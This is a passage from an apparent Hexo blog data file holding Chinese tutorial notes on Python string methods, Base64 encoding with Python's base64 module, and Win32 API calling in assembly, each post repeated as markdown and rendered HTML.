class=\"comment\">#'aBc'</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>本质是产生了一个新的字符串，因为字符串时不可变对象</li>\n</ul>\n<h4 id=\"S\"><a href=\"#S\" class=\"headerlink\" title=\"S\"></a>S</h4><h5 id=\"strip-脱掉字符串两端的指定字符串\"><a href=\"#strip-脱掉字符串两端的指定字符串\" class=\"headerlink\" title=\"strip() #脱掉字符串两端的指定字符串\"></a>strip() #脱掉字符串两端的指定字符串</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'abc\\n'</span>.strip()      <span class=\"comment\">#'abc'</span></span><br><span class=\"line\"><span class=\"string\">'abca'</span>.strip(<span class=\"string\">'a'</span>)    <span class=\"comment\">#'bc'</span></span><br><span class=\"line\"></span><br><span class=\"line\">a=<span class=\"string\">'abc'</span></span><br><span class=\"line\">a.strip(<span class=\"string\">'c'</span>)   <span class=\"comment\">#'ab'</span></span><br><span class=\"line\">print(a)       <span class=\"comment\">#'abc'</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>不指定字符串默认脱掉换行符、制表符等</li>\n<li>脱掉并返回脱掉后剩下的字符串</li>\n<li>==该操作不会对原字符串产生影响，因为字符串是不可变的。该操作只是产生一个新的字符串，原字符串仍然未变，效果就是字符串只是暂时脱掉而已==</li>\n<li>lstrip()表示只脱掉最左端的</li>\n<li>rstrip()表示只脱最右边的</li>\n</ul>\n<h5 id=\"swapcase-大小写翻转，大写变小写，小变大\"><a href=\"#swapcase-大小写翻转，大写变小写，小变大\" class=\"headerlink\" title=\"swapcase()#大小写翻转，大写变小写，小变大\"></a>swapcase()#大小写翻转，大写变小写，小变大</h5><h5 id=\"zfill-右对齐，不足填0\"><a href=\"#zfill-右对齐，不足填0\" class=\"headerlink\" title=\"zfill()#右对齐，不足填0\"></a>zfill()#右对齐，不足填0</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'abc'</span>.zfill(<span class=\"number\">5</span>)    <span class=\"comment\">#'00abc'</span></span><br></pre></td></tr></table></figure>"},{"title":"Python模块 Chapter 1：Base64","date":"2019-03-29T08:22:48.000Z","_content":"\n### Base64\n\n#### 0x00 Base64编码概述\n\n- Base64字符集共64个ASCII字符，Base64编码即用这64个ASCII字符来表示任意二进制数据的方法。\n- Base64主要是为了解决有些非打印字符二进制无法正常显示。比如我们使用notepad打开图片，会有乱码。通过对任何二进制数据进行Base64编码后，该数据都可以以字符的形式表现。\n\n<!-- more -->\n\n#### 0x01 编码原理\n\n1. 将内存中每3个字节的二进制数据分为一组，一组3*8=24个字节。\n2. 再将每组分为4个小组，每个小组24/4=6bit。\n3. 计算每个小组的数字索引（0——63）。\n4. 将计算得到的数字索引查找Base字符集表得到对应ASCII字符，该字符就是该小组编码后得到的结果。\n5. 以此类推，依次进行分组编码。\n\n![](01python模块之Base64\\QQ截图20190329170758.png)\n\n**Misc**\n\n- 所以，Base64编码会把3字节的二进制数据编码为4字节的文本数据。\n- 如果要编码的二进制数据不是3的倍数，Base64用`\\x00`字节在末尾补足后，再在编码的得到的字符串末尾加上1个或2个=号，表示补了多少字节，解码的时候，会自动去掉。\n- 可以自己定义64个字符的排列顺序，这样就可以自定义Base64编码，不过，通常情况下完全没有必要。\n- Base64是一种编码方法，不能用于加密，不存在安全性，即使使用自定义的编码表也不行。\n- Base64适用于小段内容的编码，比如数字证书签名、Cookie的内容等。\n- 由于‘=’字符也可能出现在Base64编码中，但‘=’用在URL、Cookie里面会造成歧义，所以，很多Base64编码后会把=去掉。去掉=后怎么解码呢？\n\n> 因为Base64是把3个字节变为4个字节，所以，Base64编码的长度永远是4的倍数，因此，需要加上=把Base64字符串的长度变为4的倍数，就可以正常解码了。\n\n#### 0x02 Python Base64\n\n```python\n1.标准Base64:\n\timport base64\n\n\tbase64.b64encode(b'superwu') #base64编码\n\tbase64.b64decode(b'c3VwZXJ3dQ==') #base64解码\n\n2.由于标准的Base64编码后可能出现字符+和/，在URL中就不能直接作为参数,会产生歧义，所以又有一种\"url safe\"的base64编码，其实就是把字符+和/分别变成-和_：\n\t>>> base64.b64encode(b'i\\xb7\\x1d\\xfb\\xef\\xff') #标准base64编码\n\t\tb'abcd++//'\n\t>>> base64.urlsafe_b64encode(b'i\\xb7\\x1d\\xfb\\xef\\xff') #\n\t\tb'abcd--__'\n\t>>> base64.urlsafe_b64decode('abcd--__')\n\t\tb'i\\xb7\\x1d\\xfb\\xef\\xff'\n```\n\n\n\n","source":"_posts/01python模块之Base64.md","raw":"---\ntitle: Python模块 Chapter 1：Base64\ndate: 2019-03-29 16:22:48\ntags:\n\t- Python模块\n\t- Language\ncategories: Python\n---\n\n### Base64\n\n#### 0x00 Base64编码概述\n\n- Base64字符集共64个ASCII字符，Base64编码即用这64个ASCII字符来表示任意二进制数据的方法。\n- Base64主要是为了解决有些非打印字符二进制无法正常显示。比如我们使用notepad打开图片，会有乱码。通过对任何二进制数据进行Base64编码后，该数据都可以以字符的形式表现。\n\n<!-- more -->\n\n#### 0x01 编码原理\n\n1. 将内存中每3个字节的二进制数据分为一组，一组3*8=24个字节。\n2. 再将每组分为4个小组，每个小组24/4=6bit。\n3. 计算每个小组的数字索引（0——63）。\n4. 将计算得到的数字索引查找Base字符集表得到对应ASCII字符，该字符就是该小组编码后得到的结果。\n5. 以此类推，依次进行分组编码。\n\n![](01python模块之Base64\\QQ截图20190329170758.png)\n\n**Misc**\n\n- 所以，Base64编码会把3字节的二进制数据编码为4字节的文本数据。\n- 如果要编码的二进制数据不是3的倍数，Base64用`\\x00`字节在末尾补足后，再在编码的得到的字符串末尾加上1个或2个=号，表示补了多少字节，解码的时候，会自动去掉。\n- 可以自己定义64个字符的排列顺序，这样就可以自定义Base64编码，不过，通常情况下完全没有必要。\n- Base64是一种编码方法，不能用于加密，不存在安全性，即使使用自定义的编码表也不行。\n- Base64适用于小段内容的编码，比如数字证书签名、Cookie的内容等。\n- 由于‘=’字符也可能出现在Base64编码中，但‘=’用在URL、Cookie里面会造成歧义，所以，很多Base64编码后会把=去掉。去掉=后怎么解码呢？\n\n> 因为Base64是把3个字节变为4个字节，所以，Base64编码的长度永远是4的倍数，因此，需要加上=把Base64字符串的长度变为4的倍数，就可以正常解码了。\n\n#### 0x02 Python Base64\n\n```python\n1.标准Base64:\n\timport base64\n\n\tbase64.b64encode(b'superwu') #base64编码\n\tbase64.b64decode(b'c3VwZXJ3dQ==') #base64解码\n\n2.由于标准的Base64编码后可能出现字符+和/，在URL中就不能直接作为参数,会产生歧义，所以又有一种\"url safe\"的base64编码，其实就是把字符+和/分别变成-和_：\n\t>>> base64.b64encode(b'i\\xb7\\x1d\\xfb\\xef\\xff') #标准base64编码\n\t\tb'abcd++//'\n\t>>> base64.urlsafe_b64encode(b'i\\xb7\\x1d\\xfb\\xef\\xff') #\n\t\tb'abcd--__'\n\t>>> base64.urlsafe_b64decode('abcd--__')\n\t\tb'i\\xb7\\x1d\\xfb\\xef\\xff'\n```\n\n\n\n","slug":"01python模块之Base64","published":1,"updated":"2019-03-29T09:10:54.997Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83j400087or0radrkusq","content":"<h3 id=\"Base64\"><a href=\"#Base64\" class=\"headerlink\" title=\"Base64\"></a>Base64</h3><h4 id=\"0x00-Base64编码概述\"><a href=\"#0x00-Base64编码概述\" class=\"headerlink\" title=\"0x00 Base64编码概述\"></a>0x00 Base64编码概述</h4><ul>\n<li>Base64字符集共64个ASCII字符，Base64编码即用这64个ASCII字符来表示任意二进制数据的方法。</li>\n<li>Base64主要是为了解决有些非打印字符二进制无法正常显示。比如我们使用notepad打开图片，会有乱码。通过对任何二进制数据进行Base64编码后，该数据都可以以字符的形式表现。</li>\n</ul>\n<a id=\"more\"></a>\n<h4 id=\"0x01-编码原理\"><a href=\"#0x01-编码原理\" class=\"headerlink\" title=\"0x01 编码原理\"></a>0x01 编码原理</h4><ol>\n<li>将内存中每3个字节的二进制数据分为一组，一组3*8=24个字节。</li>\n<li>再将每组分为4个小组，每个小组24/4=6bit。</li>\n<li>计算每个小组的数字索引（0——63）。</li>\n<li>将计算得到的数字索引查找Base字符集表得到对应ASCII字符，该字符就是该小组编码后得到的结果。</li>\n<li>以此类推，依次进行分组编码。</li>\n</ol>\n<p><img src=\"/2019/03/29/01python模块之Base64/QQ截图20190329170758.png\" alt></p>\n<p><strong>Misc</strong></p>\n<ul>\n<li>所以，Base64编码会把3字节的二进制数据编码为4字节的文本数据。</li>\n<li>如果要编码的二进制数据不是3的倍数，Base64用<code>\\x00</code>字节在末尾补足后，再在编码的得到的字符串末尾加上1个或2个=号，表示补了多少字节，解码的时候，会自动去掉。</li>\n<li>可以自己定义64个字符的排列顺序，这样就可以自定义Base64编码，不过，通常情况下完全没有必要。</li>\n<li>Base64是一种编码方法，不能用于加密，不存在安全性，即使使用自定义的编码表也不行。</li>\n<li>Base64适用于小段内容的编码，比如数字证书签名、Cookie的内容等。</li>\n<li>由于‘=’字符也可能出现在Base64编码中，但‘=’用在URL、Cookie里面会造成歧义，所以，很多Base64编码后会把=去掉。去掉=后怎么解码呢？</li>\n</ul>\n<blockquote>\n<p>因为Base64是把3个字节变为4个字节，所以，Base64编码的长度永远是4的倍数，因此，需要加上=把Base64字符串的长度变为4的倍数，就可以正常解码了。</p>\n</blockquote>\n<h4 id=\"0x02-Python-Base64\"><a href=\"#0x02-Python-Base64\" class=\"headerlink\" title=\"0x02 Python Base64\"></a>0x02 Python Base64</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>标准Base64:</span><br><span class=\"line\">\t<span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\">\tbase64.b64encode(<span class=\"string\">b'superwu'</span>) <span class=\"comment\">#base64编码</span></span><br><span class=\"line\">\tbase64.b64decode(<span class=\"string\">b'c3VwZXJ3dQ=='</span>) <span class=\"comment\">#base64解码</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">2.</span>由于标准的Base64编码后可能出现字符+和/，在URL中就不能直接作为参数,会产生歧义，所以又有一种<span class=\"string\">\"url safe\"</span>的base64编码，其实就是把字符+和/分别变成-和_：</span><br><span class=\"line\">\t&gt;&gt;&gt; base64.b64encode(<span class=\"string\">b'i\\xb7\\x1d\\xfb\\xef\\xff'</span>) <span class=\"comment\">#标准base64编码</span></span><br><span class=\"line\">\t\t<span class=\"string\">b'abcd++//'</span></span><br><span class=\"line\">\t&gt;&gt;&gt; base64.urlsafe_b64encode(<span class=\"string\">b'i\\xb7\\x1d\\xfb\\xef\\xff'</span>) <span class=\"comment\">#</span></span><br><span class=\"line\">\t\t<span class=\"string\">b'abcd--__'</span></span><br><span class=\"line\">\t&gt;&gt;&gt; base64.urlsafe_b64decode(<span class=\"string\">'abcd--__'</span>)</span><br><span class=\"line\">\t\t<span class=\"string\">b'i\\xb7\\x1d\\xfb\\xef\\xff'</span></span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<h3 id=\"Base64\"><a href=\"#Base64\" class=\"headerlink\" title=\"Base64\"></a>Base64</h3><h4 id=\"0x00-Base64编码概述\"><a href=\"#0x00-Base64编码概述\" class=\"headerlink\" title=\"0x00 Base64编码概述\"></a>0x00 Base64编码概述</h4><ul>\n<li>Base64字符集共64个ASCII字符，Base64编码即用这64个ASCII字符来表示任意二进制数据的方法。</li>\n<li>Base64主要是为了解决有些非打印字符二进制无法正常显示。比如我们使用notepad打开图片，会有乱码。通过对任何二进制数据进行Base64编码后，该数据都可以以字符的形式表现。</li>\n</ul>","more":"<h4 id=\"0x01-编码原理\"><a href=\"#0x01-编码原理\" class=\"headerlink\" title=\"0x01 编码原理\"></a>0x01 编码原理</h4><ol>\n<li>将内存中每3个字节的二进制数据分为一组，一组3*8=24个字节。</li>\n<li>再将每组分为4个小组，每个小组24/4=6bit。</li>\n<li>计算每个小组的数字索引（0——63）。</li>\n<li>将计算得到的数字索引查找Base字符集表得到对应ASCII字符，该字符就是该小组编码后得到的结果。</li>\n<li>以此类推，依次进行分组编码。</li>\n</ol>\n<p><img src=\"/2019/03/29/01python模块之Base64/QQ截图20190329170758.png\" alt></p>\n<p><strong>Misc</strong></p>\n<ul>\n<li>所以，Base64编码会把3字节的二进制数据编码为4字节的文本数据。</li>\n<li>如果要编码的二进制数据不是3的倍数，Base64用<code>\\x00</code>字节在末尾补足后，再在编码的得到的字符串末尾加上1个或2个=号，表示补了多少字节，解码的时候，会自动去掉。</li>\n<li>可以自己定义64个字符的排列顺序，这样就可以自定义Base64编码，不过，通常情况下完全没有必要。</li>\n<li>Base64是一种编码方法，不能用于加密，不存在安全性，即使使用自定义的编码表也不行。</li>\n<li>Base64适用于小段内容的编码，比如数字证书签名、Cookie的内容等。</li>\n<li>由于‘=’字符也可能出现在Base64编码中，但‘=’用在URL、Cookie里面会造成歧义，所以，很多Base64编码后会把=去掉。去掉=后怎么解码呢？</li>\n</ul>\n<blockquote>\n<p>因为Base64是把3个字节变为4个字节，所以，Base64编码的长度永远是4的倍数，因此，需要加上=把Base64字符串的长度变为4的倍数，就可以正常解码了。</p>\n</blockquote>\n<h4 id=\"0x02-Python-Base64\"><a href=\"#0x02-Python-Base64\" class=\"headerlink\" title=\"0x02 Python Base64\"></a>0x02 Python Base64</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>标准Base64:</span><br><span class=\"line\">\t<span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\">\tbase64.b64encode(<span class=\"string\">b'superwu'</span>) <span class=\"comment\">#base64编码</span></span><br><span class=\"line\">\tbase64.b64decode(<span class=\"string\">b'c3VwZXJ3dQ=='</span>) <span class=\"comment\">#base64解码</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">2.</span>由于标准的Base64编码后可能出现字符+和/，在URL中就不能直接作为参数,会产生歧义，所以又有一种<span class=\"string\">\"url safe\"</span>的base64编码，其实就是把字符+和/分别变成-和_：</span><br><span class=\"line\">\t&gt;&gt;&gt; base64.b64encode(<span class=\"string\">b'i\\xb7\\x1d\\xfb\\xef\\xff'</span>) <span class=\"comment\">#标准base64编码</span></span><br><span class=\"line\">\t\t<span class=\"string\">b'abcd++//'</span></span><br><span class=\"line\">\t&gt;&gt;&gt; base64.urlsafe_b64encode(<span class=\"string\">b'i\\xb7\\x1d\\xfb\\xef\\xff'</span>) <span class=\"comment\">#</span></span><br><span class=\"line\">\t\t<span class=\"string\">b'abcd--__'</span></span><br><span class=\"line\">\t&gt;&gt;&gt; base64.urlsafe_b64decode(<span class=\"string\">'abcd--__'</span>)</span><br><span class=\"line\">\t\t<span class=\"string\">b'i\\xb7\\x1d\\xfb\\xef\\xff'</span></span><br></pre></td></tr></table></figure>"},{"title":"Win32编程基础Chapter 3：Win API","date":"2019-04-01T05:26:20.000Z","_content":"\n#### 0x00 Win API概述\n\nWin32 API实际是以一种新方法代替的DOS中用软中断的方式。\n\nAPI函数即将系统的功能的封装成模块（函数），在编程中，若想要使用系统的某功能，只需要调用对应的API函数，并传入相应的参数即可。\n\n一个个系统功能被封装成一个个API函数，最终放在Window的动态链接库（DLL）中。DLL是一种可执行文件，格式采用与.exe文件同样的PE文件格式。\n\n在PE文件的导出表中，会以字符串的形式指出该DLL能够提供的API函数的列表，只需要在应用程序中使用字符串形式的函数名进行API函数的调用即可。\n\n<!-- more -->\n\n#### 0x01 Win32 API的核心由3个DLL提供：\n\n- KERNEL32.DLL ：系统服务功能。包括内存管理、任务管理等。\n- GDI32.DLL ：图像设备接口。利用显示设备驱动程序完成显示文件和矩形等功能。\n- USER32.DLL ：用户接口服务。建立窗口和传递消息等。\n\n> 此外，还有其他的DLL，不同的DLL实现不同的系统功能，如：Wsocket32.dll ：提供使用TCP/IP进行网络通信功能。 \n\n#### 0x02 函数原型\n\n在调用API函数时，函数原型必须预先声明，否则编译器无法识别。声明格式：\n\n```\n函数名  proto [参数1]:类型 [,参数2]:类型\n```\n\nproto是函数声明的伪指令。\n\n参数名实际上是无意义的，因为编译器只关心参数数量，参数名在这只是提高可读性，类型基本都是dword。因此参数名可省略不写，只写 `:类型`。\n\n#### 0x03 API函数调用：\n\nWin32 API使用堆栈来传递参数，调用者将参数从右向左依次压入栈中，DLL中对应的被调用函数程序从栈中再依次弹出取出数据,并在返回前将栈中无用参数丢弃。\n\n```assembly\n;调用MessageBox\n\npush uType\npush lpCaption\npush lpText\npush hWnd\ncall MessageBox\n```\n\n- 在编译链接之后，`call MessageBox`语句中的MessageBox会被替换为一个指向PE导入表的地址。\n\n传入的参数可能使用不同的数据类型，但其实对于汇编语言而言，传入的参数都是32位（dd）的整数，之所以在Win32 API中使用不同数据类型，只是为了说明用途便于理解而已。\n\n#### 0x04 Invoke\n\n可在每次函数调用的语句前添加，作用是检查传入的参数数量与API函数要求的参数数量是否一致，即参数是否对齐，若没有对齐，在编译程序时将报错。\n\n该指令是伪指令，由编译器识别，并不是必要的指令。\n\n使用格式：\n\n```assembly\ninvoke 函数名 [,参数1] [,参数2] [...]\n```\n\n#### 0x05 API函数返回值\n\n- 函数的返回值也只有dd这一种整数类型，返回值永远放在EAX寄存器中。\n\n> 如果32位的EAX不足以存放返回数据，Win32 API采用的方法是，EAX返回一个指向真正返回值的地址指针。或者函数多定义一个参数，用于在函数调用时传递一个定义好了的缓冲区的地址，然后直接将返回值返回到缓冲区中去。\n\n#### 0x06 include\n\n- include作用与C语言的一样，通常用于把包含许多函数原型的文件包含进来。\n\n> 每一个DLL对应一个<DLL库名.inc>文件，需要使用DLL中的API函数，只需要包含对应的DLL的DDL.inc文件即可。\n\n- 编译器对于include的处理，就只是将include的文件的所有内容与该语句进行替换而已。\n\n#### 0x07 includelib\n\n要想使用API函数，就必须先知道API函数存在哪个DLL中，所以需要有一个文件存放DLL的正确位置信息，这个文件就是导入库。\n\n导入库包含函数的位置信息和参数的个数等简单信息，一个DLL对应一个导入库。要想使用某DLL中的API函数，可以使用:\n\n```assembly\nincludelib 库文件名\n\t或者\nincludelib <库文件名>\n```\n\n静态链接库是一组编写好的代码模块，可以在程序中被引用，程序被编译为目标文件，然后在目标文件被链接成为可执行文件的时候，链接程序会找到静态库中的相应函数代码并把它一同链接到可执行文件中。\n\n与include不同，编译器处理includelib的方式不会把库文件的内容与该指令进行替换，它只告知连接器到指定的库文件去寻找函数的位置信息而已。\n\n![](02-win32编程基础Chapter-3\\图片1.png)","source":"_posts/02-win32编程基础Chapter-3.md","raw":"---\ntitle: Win32编程基础Chapter 3：Win API\ndate: 2019-04-01 13:26:20\ntags:\n\t- Win32\n\t- 汇编语言\ncategories: Win32\n---\n\n#### 0x00 Win API概述\n\nWin32 API实际是以一种新方法代替的DOS中用软中断的方式。\n\nAPI函数即将系统的功能的封装成模块（函数），在编程中，若想要使用系统的某功能，只需要调用对应的API函数，并传入相应的参数即可。\n\n一个个系统功能被封装成一个个API函数，最终放在Window的动态链接库（DLL）中。DLL是一种可执行文件，格式采用与.exe文件同样的PE文件格式。\n\n在PE文件的导出表中，会以字符串的形式指出该DLL能够提供的API函数的列表，只需要在应用程序中使用字符串形式的函数名进行API函数的调用即可。\n\n<!-- more -->\n\n#### 0x01 Win32 API的核心由3个DLL提供：\n\n- KERNEL32.DLL ：系统服务功能。包括内存管理、任务管理等。\n- GDI32.DLL ：图像设备接口。利用显示设备驱动程序完成显示文件和矩形等功能。\n- USER32.DLL ：用户接口服务。建立窗口和传递消息等。\n\n> 此外，还有其他的DLL，不同的DLL实现不同的系统功能，如：Wsocket32.dll ：提供使用TCP/IP进行网络通信功能。 \n\n#### 0x02 函数原型\n\n在调用API函数时，函数原型必须预先声明，否则编译器无法识别。声明格式：\n\n```\n函数名  proto [参数1]:类型 [,参数2]:类型\n```\n\nproto是函数声明的伪指令。\n\n参数名实际上是无意义的，因为编译器只关心参数数量，参数名在这只是提高可读性，类型基本都是dword。因此参数名可省略不写，只写 `:类型`。\n\n#### 0x03 API函数调用：\n\nWin32 API使用堆栈来传递参数，调用者将参数从右向左依次压入栈中，DLL中对应的被调用函数程序从栈中再依次弹出取出数据,并在返回前将栈中无用参数丢弃。\n\n```assembly\n;调用MessageBox\n\npush uType\npush lpCaption\npush lpText\npush hWnd\ncall MessageBox\n```\n\n- 在编译链接之后，`call MessageBox`语句中的MessageBox会被替换为一个指向PE导入表的地址。\n\n传入的参数可能使用不同的数据类型，但其实对于汇编语言而言，传入的参数都是32位（dd）的整数，之所以在Win32 API中使用不同数据类型，只是为了说明用途便于理解而已。\n\n#### 0x04 Invoke\n\n可在每次函数调用的语句前添加，作用是检查传入的参数数量与API函数要求的参数数量是否一致，即参数是否对齐，若没有对齐，在编译程序时将报错。\n\n该指令是伪指令，由编译器识别，并不是必要的指令。\n\n使用格式：\n\n```assembly\ninvoke 函数名 [,参数1] [,参数2] [...]\n```\n\n#### 0x05 API函数返回值\n\n- 函数的返回值也只有dd这一种整数类型，返回值永远放在EAX寄存器中。\n\n> 如果32位的EAX不足以存放返回数据，Win32 API采用的方法是，EAX返回一个指向真正返回值的地址指针。或者函数多定义一个参数，用于在函数调用时传递一个定义好了的缓冲区的地址，然后直接将返回值返回到缓冲区中去。\n\n#### 0x06 include\n\n- include作用与C语言的一样，通常用于把包含许多函数原型的文件包含进来。\n\n> 每一个DLL对应一个<DLL库名.inc>文件，需要使用DLL中的API函数，只需要包含对应的DLL的DDL.inc文件即可。\n\n- 编译器对于include的处理，就只是将include的文件的所有内容与该语句进行替换而已。\n\n#### 0x07 includelib\n\n要想使用API函数，就必须先知道API函数存在哪个DLL中，所以需要有一个文件存放DLL的正确位置信息，这个文件就是导入库。\n\n导入库包含函数的位置信息和参数的个数等简单信息，一个DLL对应一个导入库。要想使用某DLL中的API函数，可以使用:\n\n```assembly\nincludelib 库文件名\n\t或者\nincludelib <库文件名>\n```\n\n静态链接库是一组编写好的代码模块，可以在程序中被引用，程序被编译为目标文件，然后在目标文件被链接成为可执行文件的时候，链接程序会找到静态库中的相应函数代码并把它一同链接到可执行文件中。\n\n与include不同，编译器处理includelib的方式不会把库文件的内容与该指令进行替换，它只告知连接器到指定的库文件去寻找函数的位置信息而已。\n\n![](02-win32编程基础Chapter-3\\图片1.png)","slug":"02-win32编程基础Chapter-3","published":1,"updated":"2019-04-01T06:18:47.241Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83j8000b7or0vowj60fg","content":"<h4 id=\"0x00-Win-API概述\"><a href=\"#0x00-Win-API概述\" class=\"headerlink\" title=\"0x00 Win API概述\"></a>0x00 Win API概述</h4><p>Win32 API实际是以一种新方法代替的DOS中用软中断的方式。</p>\n<p>API函数即将系统的功能的封装成模块（函数），在编程中，若想要使用系统的某功能，只需要调用对应的API函数，并传入相应的参数即可。</p>\n<p>一个个系统功能被封装成一个个API函数，最终放在Window的动态链接库（DLL）中。DLL是一种可执行文件，格式采用与.exe文件同样的PE文件格式。</p>\n<p>在PE文件的导出表中，会以字符串的形式指出该DLL能够提供的API函数的列表，只需要在应用程序中使用字符串形式的函数名进行API函数的调用即可。</p>\n<a id=\"more\"></a>\n<h4 id=\"0x01-Win32-API的核心由3个DLL提供：\"><a href=\"#0x01-Win32-API的核心由3个DLL提供：\" class=\"headerlink\" title=\"0x01 Win32 API的核心由3个DLL提供：\"></a>0x01 Win32 API的核心由3个DLL提供：</h4><ul>\n<li>KERNEL32.DLL ：系统服务功能。包括内存管理、任务管理等。</li>\n<li>GDI32.DLL ：图像设备接口。利用显示设备驱动程序完成显示文件和矩形等功能。</li>\n<li>USER32.DLL ：用户接口服务。建立窗口和传递消息等。</li>\n</ul>\n<blockquote>\n<p>此外，还有其他的DLL，不同的DLL实现不同的系统功能，如：Wsocket32.dll ：提供使用TCP/IP进行网络通信功能。 </p>\n</blockquote>\n<h4 id=\"0x02-函数原型\"><a href=\"#0x02-函数原型\" class=\"headerlink\" title=\"0x02 函数原型\"></a>0x02 函数原型</h4><p>在调用API函数时，函数原型必须预先声明，否则编译器无法识别。声明格式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">函数名  proto [参数1]:类型 [,参数2]:类型</span><br></pre></td></tr></table></figure>\n<p>proto是函数声明的伪指令。</p>\n<p>参数名实际上是无意义的，因为编译器只关心参数数量，参数名在这只是提高可读性，类型基本都是dword。因此参数名可省略不写，只写 <code>:类型</code>。</p>\n<h4 id=\"0x03-API函数调用：\"><a href=\"#0x03-API函数调用：\" class=\"headerlink\" title=\"0x03 API函数调用：\"></a>0x03 API函数调用：</h4><p>Win32 API使用堆栈来传递参数，调用者将参数从右向左依次压入栈中，DLL中对应的被调用函数程序从栈中再依次弹出取出数据,并在返回前将栈中无用参数丢弃。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">;调用MessageBox</span><br><span class=\"line\"></span><br><span class=\"line\">push uType</span><br><span class=\"line\">push lpCaption</span><br><span class=\"line\">push lpText</span><br><span class=\"line\">push hWnd</span><br><span class=\"line\">call MessageBox</span><br></pre></td></tr></table></figure>\n<ul>\n<li>在编译链接之后，<code>call MessageBox</code>语句中的MessageBox会被替换为一个指向PE导入表的地址。</li>\n</ul>\n<p>传入的参数可能使用不同的数据类型，但其实对于汇编语言而言，传入的参数都是32位（dd）的整数，之所以在Win32 API中使用不同数据类型，只是为了说明用途便于理解而已。</p>\n<h4 id=\"0x04-Invoke\"><a href=\"#0x04-Invoke\" class=\"headerlink\" title=\"0x04 Invoke\"></a>0x04 Invoke</h4><p>可在每次函数调用的语句前添加，作用是检查传入的参数数量与API函数要求的参数数量是否一致，即参数是否对齐，若没有对齐，在编译程序时将报错。</p>\n<p>该指令是伪指令，由编译器识别，并不是必要的指令。</p>\n<p>使用格式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">invoke 函数名 [,参数1] [,参数2] [...]</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x05-API函数返回值\"><a href=\"#0x05-API函数返回值\" class=\"headerlink\" title=\"0x05 API函数返回值\"></a>0x05 API函数返回值</h4><ul>\n<li>函数的返回值也只有dd这一种整数类型，返回值永远放在EAX寄存器中。</li>\n</ul>\n<blockquote>\n<p>如果32位的EAX不足以存放返回数据，Win32 API采用的方法是，EAX返回一个指向真正返回值的地址指针。或者函数多定义一个参数，用于在函数调用时传递一个定义好了的缓冲区的地址，然后直接将返回值返回到缓冲区中去。</p>\n</blockquote>\n<h4 id=\"0x06-include\"><a href=\"#0x06-include\" class=\"headerlink\" title=\"0x06 include\"></a>0x06 include</h4><ul>\n<li>include作用与C语言的一样，通常用于把包含许多函数原型的文件包含进来。</li>\n</ul>\n<blockquote>\n<p>每一个DLL对应一个&lt;DLL库名.inc&gt;文件，需要使用DLL中的API函数，只需要包含对应的DLL的DDL.inc文件即可。</p>\n</blockquote>\n<ul>\n<li>编译器对于include的处理，就只是将include的文件的所有内容与该语句进行替换而已。</li>\n</ul>\n<h4 id=\"0x07-includelib\"><a href=\"#0x07-includelib\" class=\"headerlink\" title=\"0x07 includelib\"></a>0x07 includelib</h4><p>要想使用API函数，就必须先知道API函数存在哪个DLL中，所以需要有一个文件存放DLL的正确位置信息，这个文件就是导入库。</p>\n<p>导入库包含函数的位置信息和参数的个数等简单信息，一个DLL对应一个导入库。要想使用某DLL中的API函数，可以使用:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">includelib 库文件名</span><br><span class=\"line\">\t或者</span><br><span class=\"line\">includelib &lt;库文件名&gt;</span><br></pre></td></tr></table></figure>\n<p>静态链接库是一组编写好的代码模块，可以在程序中被引用，程序被编译为目标文件，然后在目标文件被链接成为可执行文件的时候，链接程序会找到静态库中的相应函数代码并把它一同链接到可执行文件中。</p>\n<p>与include不同，编译器处理includelib的方式不会把库文件的内容与该指令进行替换，它只告知连接器到指定的库文件去寻找函数的位置信息而已。</p>\n<p><img src=\"/2019/04/01/02-win32编程基础Chapter-3/图片1.png\" alt></p>\n","site":{"data":{}},"excerpt":"<h4 